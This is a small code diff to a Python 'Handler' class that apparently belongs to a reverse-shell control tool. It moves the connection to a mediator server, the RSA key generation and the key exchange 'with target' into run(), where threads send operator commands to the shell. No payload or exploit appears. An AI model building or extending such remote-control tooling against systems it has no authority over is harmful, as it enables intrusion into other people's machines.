@@ -26,9 +26,8 @@ class Handler:
         self.plugins = self.loadPlugins()
         if not mediatorHost:
             raise(ValueError("Hostname of mediator server not specified."))
-        self.connect(mediatorHost)
-        self.privKey, self.pubKey = self.getRSA()
-        self.cipherKey = self.keyExchange()
+        self.mediatorHost = mediatorHost
+        # self.privKey, self.pubKey, self.cipherKey declared in Handler.run()
 
     def loadPlugins(self):
         commandClasses = inspect.getmembers(plugins, inspect.isclass)
@@ -148,6 +147,10 @@ class Handler:
             print("Server responded with the wrong key: {}".format(verification.decode()))
 
     def run(self):
+        # connect to server and perform key exchange with target
+        self.connect(self.mediatorHost)
+        self.privKey, self.pubKey = self.getRSA()
+        self.cipherKey = self.keyExchange()
         # start I/O threads to control the reverse shell
         operatorToShell = threading.Thread(target=self.sendCommands, args=[])
         operatorToShell.daemon = True
